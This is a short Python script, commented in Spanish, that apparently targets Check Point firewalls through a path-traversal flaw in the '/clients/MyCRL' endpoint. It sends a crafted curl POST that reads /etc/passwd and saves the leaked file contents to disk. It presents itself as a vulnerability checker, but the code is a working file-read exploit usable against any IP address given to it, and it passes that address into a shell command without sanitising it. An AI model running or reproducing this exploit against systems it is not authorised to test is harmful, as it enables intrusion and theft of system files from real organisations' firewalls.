import os
import subprocess
import argparse

def ejecutar_curl(ip):
    # Comando curl con la IP reemplazada
    comando = f"""curl --path-as-is -i -s -k -X 'POST' \\
    -H 'Host: {ip}' -H 'Connection: keep-alive' -H 'Content-Type:application/x-www-form-urlencoded' -H 'Content-Length: 39' \\
    --data-binary 'aCSHELL/../../../../../../../etc/passwd' \\
    'https://{ip}/clients/MyCRL'"""
    
    # Ejecutar el comando y capturar la salida
    resultado = subprocess.run(comando, shell=True, capture_output=True, text=True)
    return resultado.stdout

def analizar_resultado(resultado):
    # Verificar si la salida contiene 'root:x:'
    if 'root:x:' in resultado:
        return "VULNERABLE"
    else:
        return "OK"

def guardar_resultado(ip, resultado):
    # Crear el directorio output si no existe
    if not os.path.exists('output'):
        os.makedirs('output')
    
    # Guardar el resultado en un archivo
    with open(f'output/{ip}.txt', 'w') as archivo:
        archivo.write(resultado)

def main():
    # Configurar argparse para obtener la IP desde la l√≠nea de comandos
    parser = argparse.ArgumentParser(description="Verificar vulnerabilidad de Firewall Checkpoint.")
    parser.add_argument('-i', '--ip', type=str, help='IP del host a verificar')
    
    args = parser.parse_args()
    
    if not args.ip:
        print("To use this tool, please enter -i IP to check if your Firewall Checkpoint is vulnerable or not. Thanks GLOBALSECURE")
        return
    
    ip = args.ip
    print(f"Procesando IP: {ip}")
    resultado_curl = ejecutar_curl(ip)
    estado_vulnerabilidad = analizar_resultado(resultado_curl)
    print(f"IP {ip} es {estado_vulnerabilidad}")
    resultado_completo = f"IP: {ip}\nEstado: {estado_vulnerabilidad}\n\nResultado completo:\n{resultado_curl}"
    guardar_resultado(ip, resultado_completo)
    print(f"Resultado guardado en output/{ip}.txt")

if __name__ == "__main__":
    main()
